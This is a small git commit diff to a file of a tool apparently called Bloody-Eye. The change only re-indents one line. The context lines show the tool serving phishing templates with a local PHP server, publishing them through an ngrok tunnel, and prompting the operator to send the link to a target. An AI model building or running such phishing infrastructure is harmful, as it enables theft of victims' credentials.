a2d538520f5e1e7edead1c7537bc5d40a61df2ea
spaceboy11 <77511227+spaceboy11@users.noreply.github.com>
2021-10-18 23:00:14 +0330

    Update localhost.py

--- Bloody-Eye/modules/localhost.py
+++ Bloody-Eye/modules/localhost.py
@@ -556,7 +556,7 @@ exit();""")
     elif v == "02":
       with open("log","w") as phplog:
         Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
-      global token
+    global token
     a = ngrok.connect(4545,"http",auth_token=token)
     print(Fore.GREEN+" [+]"+Fore.WHITE+str(a).replace('"','').replace("NgrokTunnel:","").replace("http://","https://"))
     print(Fore.RED+"\n [+] "+Fore.LIGHTCYAN_EX+"Place Send Link To Target")
